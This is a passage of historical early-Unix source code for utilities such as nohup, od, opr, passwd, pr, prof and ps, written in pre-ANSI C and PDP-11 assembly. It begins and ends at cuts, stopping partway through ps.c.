		nlp++;
	}
	flush();
}

compare(p1, p2)
struct nl *p1, *p2;
{
	int a, i;

	a = 0;
	if(nflg) {
		if(p1->val > p2->val) {
			a = 1;
			goto out;
		}
		if(p1->val < p2->val) {
			a = -1;
			goto out;
		}
	}
	for(i=0; i<8; i++)
	if(p1->name[i] != p2->name[i]) {
		if(p1->name[i] > p2->name[i])
			a = 1; else
			a = -1;
		goto out;
	}
out:
	return(a*rflg);
}

printo(v)
{
	int i;

	printf("%c", v<0?'1':'0');
	for(i=0; i<5; i++) {
		printf("%c", ((v>>12)&7)+'0');
		v =<<3;
	}
}
-- /usr/source/s2/nohup.c mode=0100664 uid=3 gid=3 atime=174923345 mtime=169260599 --
/* nohup */
char	*args[100];
char	string[10000];

main(argc, argv)
int argc;
char *argv[];
{
	int i;
	char **argp, *strp, *p;

	if(argc < 2) {
		printf("arg count\n");
		exit();
	}
	argc--;
	argv++;
	argp = args;
	strp = string;
	for (i=0; i<9; i++)
		*strp++ = "/usr/bin/"[i];
	for(i=0; i<argc; i++) {
		*argp++ = strp;
		p = *argv++;
		while(*strp++ = *p++);
	}
	*argp = 0;
	signal(1, 1);
	signal(2, 1);
	signal(3, 1);
	execv(string+9, args);
	execv(string+4, args);
	execv(string, args);
	printf("%s not found\n", string+9);
}
-- /usr/source/s2/od.c mode=0110664 uid=3 gid=3 atime=174923357 mtime=169260599 --
int	word[16];
char	gbuf[512];
int	fi;
int	conv;
int	base	010;
int	basem	01000;
int	max;
int	gidx;
int	gcnt;
int	eof;
int	addr[2];
int	from[2];
int	key;
int	flag;
int	nword	8;

main(argc, argv)
char **argv;
{
	extern fout;
	int f, k, w, i, a[2];
	char *p;

	fout = dup(1);
	argv++;
	if(argc > 1) {
		p = *argv;
		if(*p == '-') {
			while((i = *p++) != '\0') {
				switch(i) {
				case 'o':
					conv =| 001;
					f = 6;
					break;
				case 'd':
					conv =| 002;
					f = 5;
					break;
				case 'a':
					conv =| 004;
					f = 4;
					break;
				case 'h':
					conv =| 010;
					f = 4;
					break;
				case 'c':
					conv =| 020;
					f = 5;
					break;
				case 'b':
					conv =| 040;
					f = 7;
					break;
				}
				if(f > max)
					max = f;
			}
			argc--;
			argv++;
		}
	}
	if(!conv) {
		max = 6;
		conv = 1;
	}
	if(argc > 1)
	if(**argv != '+') {
		fi = open(*argv, 0);
		if(fi < 0) {
			printf("cannot open %s\n", *argv);
			goto done;
		}
		argv++;
		argc--;
	}
	if(argc > 1)
		offset(*argv);

loop:
	f = 1;
	a[0] = addr[0];
	a[1] = addr[1];
	for(i=0; i<nword; i++) {
		w = getw();
		if(eof)
			break;
		word[i] = w;
		if(i)
			f =& w==k; else
			k = w;
	}
	if(i)
	if(f && !eof) {
		if(!(flag && k==key)) {
			dupl();
			key = k;
			from[0] = a[0];
			from[1] = a[1];
		}
		flag =+ i;
	} else {
		dupl();
		line(a, word, i);
	}
	if(!eof)
		goto loop;
	puta(addr);
	putchar('\n');

done:
	flush();
}

dupl()
{

	if(flag) {
		flag = 0;
		line(from, &key, 1);
	}
}

puta(a)
int a[2];
{

	putn(a[0], base, 4);
	putn(a[1], base, 3);
	putchar(' ');
}

line(a, w, n)
int w[];
{
	int i, f, c;

	f = 1;
	for(c=1; c; c=+c) {
		if((c&conv) == 0)
			continue;
		if(f) {
			puta(a);
			f = 0;
		} else
			for(i=0; i<8; i++)
				putchar(' ');
		for(i=0; i<n; i++) {
			putx(w[i], c);
			putchar(i==n-1? '\n': ' ');
		}
	}
}

putx(n, c)
{

	switch(c) {
	case 001:
		pre(6);
		putn(n, 8, 6);
		break;
	case 002:
		pre(5);
		putn(n, 10, 5);
		break;
	case 004:
		pre(4);
		putop(n);
		break;
	case 010:
		pre(4);
		putn(n, 16, 4);
		break;
	case 020:
		pre(5);
		putc(n);
		putchar(' ');
		putc(n>>8);
		break;
	case 040:
		pre(7);
		putn(n&0377, 8, 3);
		putchar(' ');
		putn((n>>8)&0377, 8, 3);
		break;
	}
}

getw()
{
	int b1, b2;

	b1 = getc();
	if(b1 == -1) {
		eof = 1;
		return(0);
	}
	b2 = getc();
	if(b2 == -1)
		b2 = 0;
	return(b1|(b2<<8));
}

getc()
{

	if(gidx >= gcnt) {
		gcnt = read(fi, gbuf, 512);
		if(gcnt <= 0)
			return(-1);
		gidx = 0;
	}
	if(++addr[1] >= basem) {
		addr[0]++;
		addr[1] = 0;
	}
	return(gbuf[gidx++]&0377);
}

putc(c)
{
	c =& 0377;
	if(c>037 && c<0177 && c!='\\') {
		putchar(' ');
		putchar(c);
		return;
	}
	putchar('\\');
	switch(c) {
	case '\0':
		putchar('0');
		break;
	case '\n':
		putchar('n');
		break;
	case '\\':
		putchar('\\');
		break;
	case '\t':
		putchar('t');
		break;
	default:
		putchar('?');
	}
}

putn(n, b, c)
{

	if(!c)
		return;
	putn(ldiv(0,n,b),b,c-1);
	if((n=lrem(0,n,b)) > 9)
		putchar(n-10+'a'); else
		putchar(n+'0');
}

pre(n)
{
	int i;

	for(i=n; i<max; i++)
		putchar(' ');
}

offset(s)
char s[];
{
	char *p;
	int a[2], d, i, j, b;

	p = s;
	while(*p++);
	i = p-s-1;
	b = 0;
	if(i > 0)
		if(p[-2] == 'b') {
			i--;
			b++;
			p--;
		}
	if(i > 0)
		if(p[-2] == '.') {
			i--;
			base = 10;
			basem = 1000;
		}
	a[0] = 0;
	for(j=0; i-j>3; j++) {
		d = s[j];
		if(d>='0' && d<='9')
			a[0] = a[0]*base + d-'0';
	}
	a[1] = 0;
	for(; i-j>0; j++) {
		d = s[j];
		if(d>='0' && d<='9')
			a[1] = a[1]*base + d-'0';
	}
	if(b) {
		i = a[0]*basem+a[1];
		a[0] = 0;
		a[1] = 0;
		while(i--) {
			a[1] =+ 512;
			while(a[1] >= basem) {
				a[1] =- basem;
				a[0]++;
			}
		}
	}
	i = 0;
	while(a[0] > addr[0]+1) {
		addr[1] =+ 512;
		while(addr[1] >= basem) {
			addr[1] =- basem;
			addr[0]++;
		}
		i++;
	}
	seek(fi, i, 3);
	while(a[0]!=addr[0] || a[1]!=addr[1])
		if(getc() == -1)
			break;
}

putop(n)
{
	char *p;
	int i, c;

	p = getop(n);
	for(i=0; (c = *p++) != '\0'; i++)
		putchar(c);
	for(; i<4; i++)
		putchar(' ');
}

getop(n)
{

	switch(n&0170000)
	{
	case 0000000:
		switch(n&0177000)
		{
		case 0004000:
			return("jsr");

		case 0077000:
			return("sob");
		}
		switch(n&0177400)
		{
		case 0000400:
			return("br");

		case 0001000:
			return("bne");

		case 0001400:
			return("beq");

		case 0002000:
			return("bge");

		case 0002400:
			return("blt");

		case 0003000:
			return("bgt");

		case 0003400:
			return("ble");
		}
		switch(n&0177700)
		{
		case 0000100:
			return("jmp");

		case 0000300:
			return("swab");

		case 0005000:
			return("clr");

		case 0005100:
			return("com");

		case 0005200:
			return("inc");

		case 0005300:
			return("dec");

		case 0005400:
			return("neg");

		case 0005500:
			return("adc");

		case 0005600:
			return("sbc");

		case 0005700:
			return("tst");

		case 0006000:
			return("ror");

		case 0006100:
			return("rol");

		case 0006200:
			return("asr");

		case 0006300:
			return("asl");

		case 0006400:
			return("mark");

		case 0006500:
			return("mfpi");

		case 0006600:
			return("mtpi");

		case 0006700:
			return("sxt");
		}
		switch(n&0177740)
		{
		case 0000240:
			return("flag");
		}
		switch(n&0177770)
		{
		case 0000200:
			return("rts");

		case 0000230:
			return("spl");
		}
		switch(n&0177777)
		{
		case 0000000:
			return("halt");

		case 0000001:
			return("wait");

		case 0000002:
			return("rti");

		case 0000003:
			return("bpt");

		case 0000004:
			return("iot");

		case 0000005:
			return("rset");

		case 0000006:
			return("rtt");
		}
		break;

	case 0010000:
		return("mov ");

	case 0020000:
		return("cmp");

	case 0030000:
		return("bit");

	case 0040000:
		return("bic");

	case 0050000:
		return("bis");

	case 0060000:
		return("add");

	case 0070000:
		switch(n&0177000)
		{
		case 0070000:
			return("mul");

		case 0071000:
			return("div");

		case 0072000:
			return("ash");

		case 0073000:
			return("ashc");

		case 0074000:
			return("xor");
		}
		break;

	case 0100000:
		switch(n&0177400)
		{
		case 0100000:
			return("bpl");

		case 0100400:
			return("bmi");

		case 0101000:
			return("bhi");

		case 0101400:
			return("blos");

		case 0102000:
			return("bvc");

		case 0102400:
			return("bvs");

		case 0103000:
			return("bhis");

		case 0103400:
			return("blo");

		case 0104000:
			return("emt");

		case 0104400:
			return("sys");
		}
		switch(n&0177700)
		{
		case 0105000:
			return("clrb");

		case 0105100:
			return("comb");

		case 0105200:
			return("incb");

		case 0105300:
			return("decb");

		case 0105400:
			return("negb");

		case 0105500:
			return("adcb");

		case 0105600:
			return("sbcb");

		case 0105700:
			return("tstb");

		case 0106000:
			return("rorb");

		case 0106100:
			return("rolb");

		case 0106200:
			return("asrb");

		case 0106300:
			return("aslb");

		case 0106500:
			return("mfpd");

		case 0106600:
			return("mfpd");
		}
		break;

	case 0110000:
		return("movb");

	case 0120000:
		return("cmpb");

	case 0130000:
		return("bitb");

	case 0140000:
		return("bicb");

	case 0150000:
		return("bisb");

	case 0160000:
		return("sub");

	case 0170000:
		switch(n&01777000)
		{
		case 0:0;
		}
		break;
	}
	return("???");
}
-- /usr/source/s2/opr.c mode=0100664 uid=3 gid=3 atime=174923378 mtime=169260599 --
/*
 *	opr -- off line print dispatcher
 *		chooses spooling routine appropriate 
 *		to destination
 *
 *	last entry in table isdefault
 */

char *code[] {
	"-lp",	"/lib/lpr",	/* line printer */
	0
};

main(argc, argv)
char **argv;
{
	int i, j;

	argv[argc] = 0;
	for(i=0; code[i]; i=+2)
	if(argc > 1)
		for(j=0; code[i][j]==argv[1][j]; j++)
			if(code[i][j] == 0)
					execv(code[i+1], &argv[1]);
	execv(code[i-1], argv);
	write(2, "can't start daemon\n", 19);
}
-- /usr/source/s2/passwd.c mode=0100664 uid=3 gid=3 atime=174923388 mtime=169260599 --
/*
 * enter a password in the password file
 * this program should be suid with owner
 * with an owner with write permission on /etc/passwd
 */
char	*tfile	{ "/tmp/ptmp" };
char	*pfile	{ "/etc/passwd" };
int	tbuf[259];
int	pbuf[259];

main(argc, argv)
char *argv[];
{
	register u, c;
	register char *p;

	if(argc != 3) {
		write(2, "Usage: passwd user password\n", 28);
		goto bex;
	}
	signal(1, 1);
	signal(2, 1);
	signal(3, 1);

	if(stat(tfile, tbuf+20) >= 0) {
		write(2, "Temporary file busy -- try again\n", 33);
		goto bex;
	}
	tbuf[0] = creat(tfile, 0600);
	if(tbuf[0] < 0) {
		write(2, "Cannot create temporary file\n", 29);
		goto bex;
	}
	pbuf[0] = open(pfile, 0);
	if(pbuf[0] < 0) {
		write(2, "Cannot open /etc/passwd\n", 24);
		goto out;
	}
	goto l1;

/*
 * skip to beginning of next line
 */

skip:
	while(c != '\n') {
		if(c < 0)
			goto ill;
		c = getc(pbuf);
		putc(c, tbuf);
	}

/*
 * compare user names
 */

l1:
	c = getc(pbuf);
	putc(c, tbuf);
	if(c < 0) {
		write(2, "User name not found in password file\n", 37);
		goto out;
	}
	p = argv[1];
	while(c != ':') {
		if(*p++ != c)
			goto skip;
		c = getc(pbuf);
		putc(c, tbuf);
	}
	if(*p)
		goto skip;
/*
 * skip old password
 */
	do {
		c = getc(pbuf);
		if(c < 0)
			goto ill;
	} while(c != ':');

/*
 * copy in new password
 */
	p = argv[2];
	for(c=0; c<9; c++)
		if(*p++ == 0)
			break;
	*--p = 0;
	if(p != argv[2])
		p = crypt(argv[2]);
	while(*p)
		putc(*p++, tbuf);
	putc(':', tbuf);

/*
 * validate uid
 */

	u = 0;
	do {
		c = getc(pbuf);
		putc(c, tbuf);
		if(c >= '0' && c <= '9')
			u = u*10 + c-'0';
		if(c < 0)
			goto ill;
	} while(c != ':');
	c = getuid() & 0377;
	if(c != 0 && c != u) {
		write(2, "Permission denied\n", 18);
		goto out;
	}

/*
 * copy out and back
 */

	for(;;) {
		c = getc(pbuf);
		if(c < 0) {
			fflush(tbuf);
			close(pbuf[0]);
			close(tbuf[0]);
			tbuf[0] = open(tfile, 0);
			if(tbuf[0] < 0) {
				write(2, "Urk\n", 4);
				goto out;
			}
			pbuf[0] = creat(pfile, 0644);
			if(pbuf[0] < 0) {
				write(2, "Cannot create /etc/passwd\n", 26);
				goto out;
			}
			while((c = read(tbuf[0], tbuf+1, 512)) > 0)
				write(pbuf[0], tbuf+1, c);
			unlink(tfile);
			exit(0);
		}
		putc(c, tbuf);
	}

ill:
	write(2, "Password file illformed\n", 24);

out:
	unlink(tfile);

bex:
	exit(1);
}
-- /usr/source/s2/pfe.s mode=0100664 uid=3 gid=3 atime=174923400 mtime=169260599 --
/ print last floating error

stst	= 170300^tst

	stst	r1
	cmp	r1,$14
	blos	1f
	clr	r1
1:
	bic	$1,r1
	mov	mesg(r1),r1
1:
	movb	(r1)+,ch
	beq	1f
	mov	$1,r0
	sys	write; ch; 1
	br	1b
1:
	sys	exit

mesg:
	1f
	2f
	3f
	4f
	5f
	6f
	7f
	8f

1:	<No error.\n\0>
2:	<Floating op code error\n\0>
3:	<Floating divide check\n\0>
4:	<Integer conversion error\n\0>
5:	<Floating overflow\n\0>
6:	<Floating underflow\n\0>
7:	<Floating undefined\n\0>
8:	<Floating maintennace trap\n\0>

	.even

	.bss
ch:	.=.+2

-- /usr/source/s2/pr.c mode=0110664 uid=3 gid=3 atime=174923404 mtime=169260599 --
#
/*
 *   print file with headings
 *  2+head+2+page[56]+5
 */

int	ncol	1;
char	*header;
int	col;
int	icol;
int	file;
char	*bufp;
#define	BUFS	5120
char	buffer[BUFS];
#define	FF	014
int	line;
char	*colp[72];
int	nofile;
char	isclosed[10];
int	peekc;
int	fpage;
int	page;
int	colw;
int	nspace;
int	width	72;
int	length	66;
int	plength 61;
int	margin	10;
int	ntflg;
int	mflg;
int	tabc;
char	*tty;
int	mode;

struct inode {
	int dev;
	int inum;
	int flags;
	char nlink;
	char uid;
	char gid;
	char siz0;
	int size;
	int ptr[8];
	int atime[2];
	int mtime[2];
};

main(argc, argv)
char **argv;
{
	int nfdone;
	int onintr();
	extern fout;

	tty = "/dev/ttyx";
	fout = dup(1);
	close(1);
	if ((signal(2, 1) & 01) == 0)
		signal(2, onintr);
	fixtty();
	for (nfdone=0; argc>1; argc--) {
		argv++;
		if (**argv == '-') {
			switch (*++*argv) {
			case 'h':
				if (argc>=2) {
					header = *++argv;
					argc--;
				}
				continue;

			case 't':
				ntflg++;
				continue;

			case 'l':
				length = getn(++*argv);
				continue;

			case 'w':
				width = getn(++*argv);
				continue;

			case 's':
				if (*++*argv)
					tabc = **argv;
				else
					tabc = '\t';
				continue;

			case 'm':
				mflg++;
				continue;

			default:
				ncol = getn(*argv);
				continue;
			}
		} else if (**argv == '+') {
			fpage = getn(++*argv);
		} else {
			print(*argv, argv);
			nfdone++;
			if (mflg)
				break;
		}
	}
	if (nfdone==0)
		print(0);
	flush();
	onintr();
}

onintr()
{

	chmod(tty, mode);
	exit(0);
}

fixtty()
{
	struct inode sbuf;
	extern fout;

	tty[8] = ttyn(fout);
	fstat(fout, &sbuf);
	mode = sbuf.flags&0777;
	chmod(tty, 0600);
}

print(fp, argp)
char *fp;
char **argp;
{
	struct inode sbuf;
	register int sncol, sheader;
	register char *cbuf;
	extern fout;

	if (ntflg)
		margin = 0;
	else
		margin = 10;
	if (length <= margin)
		length = 66;
	if (width <= 0)
		width = 72;
	if (ncol>72 || ncol>width) {
		write(2, "Very funny.\n", 12);
		exit();
	}
	if (mflg) {
		mopen(argp);
		ncol = nofile;
	}
	colw = width/ncol;
	sncol = ncol;
	sheader = header;
	plength = length-5;
	if (ntflg)
		plength = length;
	if (--ncol<0)
		ncol = 0;
	if (mflg)
		fp = 0;
	if (fp) {
		file = open(fp, 0);
		if (file<0)
			return;
		fstat(file, &sbuf);
	} else {
		file = 0;
		time(sbuf.mtime);
	}
	if (header == 0)
		header = fp;
	cbuf = ctime(sbuf.mtime);
	cbuf[16] = '\0';
	cbuf[24] = '\0';
	page = 1;
	icol = 0;
	colp[ncol] = bufp = buffer;
	if (mflg==0)
		nexbuf();
	while (mflg&&nofile || (!mflg)&&tpgetc(ncol)>0) {
		if (mflg==0) {
			colp[ncol]--;
			if (colp[ncol] < buffer)
				colp[ncol] = &buffer[BUFS];
		}
		line = 0;
		if (ntflg==0) {
			puts("\n\n");
			puts(cbuf+4);
			puts(" ");
			puts(cbuf+20);
			puts("  ");
			puts(header);
			puts(" Page ");
			putd(page);
			puts("\n\n\n");
		}
		putpage();
		if (ntflg==0)
			while(line<length)
				put('\n');
		page++;
	}
	if (file)
		close(file);
	ncol = sncol;
	header = sheader;
}

mopen(ap)
char **ap;
{
	register char **p, *p1;

	p = ap;
	while ((p1 = *p++) && p1 != -1) {
		isclosed[nofile] = fopen(p1, &buffer[2*259*nofile]);
		if (++nofile>=10) {
			write(2, "Too many args.\n", 15);
			exit();
		}
	}
}

putpage()
{
	register int lastcol, i, c;
	int j;

	if (ncol==0) {
		while (line<plength) {
			while((c = tpgetc(0)) && c!='\n' && c!=FF)
				putcp(c);
			putcp('\n');
			line++;
			if (c==FF)
				break;
		}
		return;
	}
	colp[0] = colp[ncol];
	if (mflg==0) for (i=1; i<=ncol; i++) {
		colp[i] = colp[i-1];
		for (j = margin; j<length; j++)
			while((c=tpgetc(i))!='\n')
				if (c==0)
					break;
	}
	while (line<plength) {
		lastcol = colw;
		for (i=0; i<ncol; i++) {
			while ((c=pgetc(i)) && c!='\n')
				if (col<lastcol || tabc!=0)
					put(c);
			if (c==0 && ntflg)
				return;
			if (tabc)
				put(tabc);
			else while (col<lastcol)
				put(' ');
			lastcol =+ colw;
		}
		while ((c = pgetc(ncol)) && c!='\n')
			put(c);
		put('\n');
	}
}

nexbuf()
{
	register int n;
	register char *rbufp;

	rbufp = bufp;
	n = &buffer[BUFS] - rbufp;
	if (n>512)
		n = 512;
	if ((n = read(file, rbufp, n)) <= 0)
		*rbufp = 0376;
	else {
		rbufp =+ n;
		if (rbufp >= &buffer[BUFS])
			rbufp = buffer;
		*rbufp = 0375;
	}
	bufp = rbufp;
}

tpgetc(ai)
{
	register char **p;
	register int c, i;

	i = ai;
	if (mflg) {
		if ((c = getc(&buffer[2*259*i])) < 0) {
			if (isclosed[i]==0) {
				isclosed[i] = 1;
				if (--nofile <= 0)
					return(0);
			}
			return('\n');
		}
		if (c==FF && ncol>0)
			c = '\n';
		return(c);
	}
loop:
	c = **(p = &colp[i]) & 0377;
	if (c == 0375) {
		nexbuf();
		c = **p & 0377;
	}
	if (c == 0376)
		return(0);
	(*p)++;
	if (*p >= &buffer[BUFS])
		*p = buffer;
	if (c==0)
		goto loop;
	return(c);
}

pgetc(i)
{
	register int c;

	if (peekc) {
		c = peekc;
		peekc = 0;
	} else
		c = tpgetc(i);
	if (tabc)
		return(c);
	switch (c) {

	case '\t':
		icol++;
		if ((icol&07) != 0)
			peekc = '\t';
		return(' ');

	case '\n':
		icol = 0;
		break;

	case 010:
	case 033:
		icol--;
		break;
	}
	if (c >= ' ')
		icol++;
	return(c);
}

puts(as)
char *as;
{
	register int c;
	register char *s;

	if ((s=as)==0)
		return;
	while (c = *s++)
		put(c);
}

putd(an)
{
	register int a, n;

	n = an;
	if (a = n/10)
		putd(a);
	put(n%10 + '0');
}

put(ac)
{
	register int ns, c;

	c = ac;
	if (tabc) {
		putcp(c);
		if (c=='\n')
			line++;
		return;
	}
	switch (c) {

	case ' ':
		nspace++;
		col++;
		return;

	case '\n':
		col = 0;
		nspace = 0;
		line++;
		break;

	case 010:
	case 033:
		if (--col<0)
			col = 0;
		if (--nspace<0)
			nspace = 0;

	}
	while(nspace) {
		if (nspace>2 && col > (ns=((col-nspace)|07))) {
			nspace = col-ns-1;
			putcp('\t');
		} else {
			nspace--;
			putcp(' ');
		}
	}
	if (c >= ' ')
		col++;
	putcp(c);
}

getn(ap)
char *ap;
{
	register int n, c;
	register char *p;

	p = ap;
	n = 0;
	while ((c = *p++) >= '0' && c <= '9')
		n = n*10 + c - '0';
	return(n);
}

putcp(c)
{
	if (page >= fpage)
		putchar(c);
}
-- /usr/source/s2/prof.c mode=0110664 uid=3 gid=3 atime=174923425 mtime=169260599 --
/*
 *  Print execution profile
 */

struct nl {
	char name[8];
	int value;
	float time;
	int ncall[2];
};

struct nl nl[600];

struct fnl {
	char fname[8];
	int flag;
	int fvalue;
};

struct cnt {
	int	cvalue;
	int	cncall[2];
} cbuf[200];

struct inode {
	int	idev;
	int inum;
	int flags;
	char nlink;
	char uid;
	char	gid;
	char	size0;
	int size;
	int ptr[8];
	int ctime[2];
	int mtime[2];
	int fill;
};

int	ibuf[259];
int	obuf[259];
int	buf[17];
int	i;
int	j;
int	highpc;
int	lowpc;
int	ccnt;
int	pcl;
int	pch;
int	bufs;
int	nname;
double	time;
double	totime;
double	maxtime;
double	scale;
double	lastx;
double	lasty;
struct nl *np;
struct nl *npe;
int	aflg;
int	vflg;
int	lflg;
int	symoff;
int	symsiz;
int	vf;
int	etext;
int	ncount;

main(argc, argv)
char **argv;
{
	char *namfil;
	int timcmp(), valcmp();
	int nf, pf, overlap;
	double fnc, ltod(), lastsx;
	struct cnt *cp;

	obuf[0] = 1;
	argv++;
	namfil = "a.out";
	while (argc>1) {
		if (**argv == '-') {
			if (*++*argv == 'l')
				lflg++;
			if (**argv == 'a')
				aflg = 040;
			if(**argv == 'v')
				vflg++;
		} else
			namfil = *argv;
		argc--;
		argv++;
	}
	if ((nf = open(namfil, 0)) < 0) {
		printf("Can't find %s\n", namfil);
		done();
	}
	read(nf, buf, 020);
	if (buf[0] != 0407 && buf[0] != 0410 && buf[0] != 0411) { /* a.out magic */
		printf("Bad format: %s\n", namfil);
		done();
	}
	symsiz = buf[4];
	symoff = buf[1] + buf[2];
	if (buf[7] != 1)
		symoff =<< 1;
	seek(nf, symoff+020, 0);
	if ((pf = open("mon.out", 0)) < 0) {
		printf("No mon.out\n");
		done();
	}
	fstat(pf, buf);
	read(pf, &lowpc, 2);
	read(pf, &highpc, 2);
	read(pf, &ncount, 2);
	bufs = buf->size/2 - 3*(ncount+1);
	read(pf, cbuf, ncount*6);
	lowpc = (lowpc>>1) & 077777;
	highpc = (highpc>>1) & 077777;
	npe = nl;
	initf(nf);
	for (nname = 0; symsiz > 0; symsiz =- 12) {
		for(i=0; i<12; i++)
			buf->fname[i] = getc(ibuf);
		if ((buf->flag | aflg) != 042)
			continue;
		buf->fvalue = (buf->fvalue>>1) & 077777;
		npe->value = buf->fvalue;
		for (i=0; i<8; i++)
			npe->name[i] = buf->fname[i];
		npe++;
		nname++;
	}
	if (nname == 0) {
		printf("No symbols: %s\n", namfil);
		done();
	}
	npe->value = 077777;
	npe++;
	for (cp = cbuf; cp < &cbuf[ncount]; cp++)
		for (np = nl; np < npe; np++)
			if (cp->cvalue-8 == np->value<<1) {
				np->ncall[0] = cp->cncall[0];
				np->ncall[1] = cp->cncall[1];
				break;
			}
	qsort(nl, nname, 18, &valcmp);
	scale = (highpc-lowpc)/(bufs+0.0);
	initf(pf);
	for (i=0; (j = getc(ibuf)) != -1; i++) {
		ccnt.fname[0] = j;
		ccnt.fname[1] = getc(ibuf);
		if (ccnt == 0)
			continue;
		time = ccnt;
		if (ccnt<0)
			time =+ 65536.;
		totime =+ time;
		if(time > maxtime)
			maxtime = time;
		pcl = lowpc + scale*i - 1;
		pch = lowpc + scale*(i+1) - 1;
		for (j=0; j<nname; j++) {
			if (pch < nl[j].value)
				break;
			if (pcl >= nl[j+1].value)
				continue;
			overlap=(min(pch,nl[j+1].value)-max(pcl,nl[j].value));
			nl[j].time =+ overlap*time/scale;
		}
	}
	if (totime==0.0) {
		printf("No time accumulated\n");
		done();
	}
	if(!vflg)
		goto print;
	vf = open("/dev/vt0", 1);
	if(vf < 0) {
		printf("Cannot open vt\n");
		done();
	}
	obuf[0] = vf;
	vtch(1);
	vtch(1);
	vtch(3);
	point(-2048., -2048.);
	point(-2048., 2048.);
	vtch(3);
	point(0., -2048.);
	point(0., 2048.);
	for(j=0; j<9; j++) {
		vtch(3);
		point(-2048., 2048. - j*512.);
		point(0., 2048. - j*512.);
	}
	lastx = 0.;
	lasty = 2048.;
	scale = 4096./(i+2);
	seek(pf, 6*(ncount+1), 0);
	initf(pf);
	lastsx = 0.0;
	while((j = getc(ibuf)) != -1) {
		ccnt.fname[0] = j;
		ccnt.fname[1] = getc(ibuf);
		time = ccnt;
		if(ccnt < 0)
			time =+ 65536.;
		vtch(3);
		point(lastsx, lasty);
		lastsx =- 2000.*time/totime;
		point(lastsx, lasty-scale);
		if (ccnt!=0 || lastx!=0.0) {
			vtch(3);
			point(lastx, lasty);
			lastx = -time*2000./maxtime;
			point(lastx, lasty);
		}
		lasty =- scale;
	}
	scale = 4096./(highpc-lowpc);
	lastx = 50.;
	for(np = nl; np<npe;  np++) {
		if(np->value < lowpc)
			continue;
		if(np->value >= highpc)
			continue;
		time = np->time/totime;
		lasty = 2048. - (np->value - lowpc)*scale;
		vtch(3);
		point(0., lasty);
		point(50., lasty);
		vtch(3);
		point(lastx-50., lasty);
		point(lastx, lasty);
		vtch(9);
		point(lastx+10., lasty+60.);
		vtch(1);
		vtch(3);
		for(j=0; j<8; j++)
			if(np->name[j] != '_')
			vtch(np->name[j]);
		vtch(0);
		lastx =+ 500.;
		if(lastx > 2000.)
			lastx = 50.;
	}
	done();

print:
	printf("    name %%time #call  ms/call\n");
	if (!lflg)
		qsort(nl, nname, 18, &timcmp);
	for (np = nl; np<npe-1; np++) {
		time = np->time/totime;
		printf("%8.8s%6.1f", np->name, 100*time);
		fnc = ltod(np->ncall);
		if (fnc != 0.0) {
			printf("%6s", locv(np->ncall[0], np->ncall[1]));
			printf(" %7.2f\n", np->time/(fnc*.06));
		} else
			printf("\n");
	}
	done();
}

min(a, b)
{
	if (a<b)
		return(a);
	return(b);
}

max(a, b)
{
	if (a>b)
		return(a);
	return(b);
}

valcmp(p1, p2)
struct nl *p1, *p2;
{
	return(p1->value - p2->value);
}

timcmp(p1, p2)
struct nl *p1, *p2;
{
	float d;

	d = p2->time - p1->time;
	if (d > 0.0)
		return(1);
	if (d < 0.0)
		return(-1);
	return(0);
}

vtch(c)
int c;
{

	putchar(c&0377);
}

point(x, y)
float x, y;
{

	point1(x);
	point1(y);
}

putchar(c)
{

	putc(c, obuf);
}

point1(xy)
float xy;
{
	int ixy;
	struct { char b1; char b2;};

	if(xy > 2047.)
		xy = 2047.;
	if(xy < -2048.)
		xy = -2048.;
	ixy = xy;
	vtch(ixy.b1);
	vtch(ixy.b2);
}

done()
{

	fflush(obuf);
	exit();
}

initf(f)
{

	ibuf[0] = f;
	ibuf[1] = 0;
	ibuf[2] = 0;
	ibuf[3] = 0;
}
-- /usr/source/s2/ps.c mode=0110664 uid=3 gid=3 atime=174923446 mtime=169260599 --
#

/*
 *	ps - process status
 *	examine and print certain things about processes
 */

#include "/usr/sys/param.h"
#include "/usr/sys/proc.h"
#include "/usr/sys/tty.h"
#include "/usr/sys/user.h"

struct {
	char name[8];
	int  type;
	char  *value;
} nl[3];

struct proc proc[NPROC];
struct tty tty;
struct user u;
int	lflg;
int	kflg;
int	xflg;
int	tflg;
int	aflg;
int	mem;
int	swap;

int	stbuf[257];
int	ndev;
char	devc[65];
int	devl[65];
int	devt[65];
char	*coref;
struct ibuf {
	char	idevmin, idevmaj;
	int	inum;
	int	iflags;
	char	inl;
	char	iuid;
	char	igid;
	char	isize0;
	int	isize;
	int	iaddr[8];
	char	*ictime[2];
	char	*imtime[2];
	int	fill;
};
int	obuf[259];


main(argc, argv)
char **argv;
{
	struct proc *p;
	int n, b;
	int i, c, mtty;
	char *ap;
	int uid, puid;

	obuf[0] = 1;
	if (argc>1) {
		ap = argv[1];
		while (*ap) switch (*ap++) {
		case 'a':
			aflg++;
			break;

		case 't':
			tflg++;
			break;

		case 'x':
			xflg++;
			break;

		case 'l':
			lflg++;
			break;

		case 'k':
			kflg++;
			break;

		}
	}

	if(chdir("/dev") < 0) {
		printf("cannot change to /dev\n");
		done();
	}
	setup(&nl[0], "_proc");
	setup(&nl[1], "_swapdev");
	nlist(argc>2? argv[2]:"/unix", nl);
	if (nl[0].type==0) {
		printf("No namelist\n");
		return;
	}
	coref = "/dev/mem";
	if(kflg)
		coref = "/usr/sys/core";
	if ((mem = open(coref, 0)) < 0) {
		printf("No mem\n");
		done();
	}
	seek(mem, nl[1].value, 0);
	read(mem, &nl[1].value, 2);
	seek(mem, nl[0].value, 0);
	read(mem, proc, sizeof proc);
	getdev();
	mtty = ttyn(0);
	uid = getuid() & 0377;
	if(lflg)
	printf("TTY F S UID   PID PRI ADDR  SZ  WCHAN COMMAND\n"); else
		printf("TTY  PID COMMAND\n");
	for (i=0; i<NPROC; i++) {
		if (proc[i].p_stat==0)
			continue;
		if (proc[i].p_ttyp==0) {
			if (xflg==0)
				continue;
			c = '?';
		} else {
			for(c=0; c<ndev; c++)
			if(devt[c] == proc[i].p_ttyp) {
				c = devc[c];
				goto out;
			}
			seek(mem, proc[i].p_ttyp, 0);
			read(mem, &tty, sizeof tty);
			for(c=0; c<ndev; c++)
			if(devl[c] == tty.t_dev) {
				devt[c] = proc[i].p_ttyp;
				c = devc[c];
				goto out;
			}
			c = '?';
		out:;
		}
		puid = proc[i].p_uid & 0377;
		if (uid != puid && aflg==0)
			continue;
		if (lflg || c!=mtty)
			printf("%c:", c);
		else
			printf("  ");
		if (lflg) {
			printf("%3o %c%4d", proc[i].p_flag,
				"0SWRIZT"[proc[i].p_stat], puid);
		}
		printf("%6l", proc[i].p_pid);
		if (lflg) {
			printf("%4d%5o%4d", proc[i].p_pri, proc[i].p_addr,
				(proc[i].p_size+7)>>3);
			if (proc[i].p_wchan)
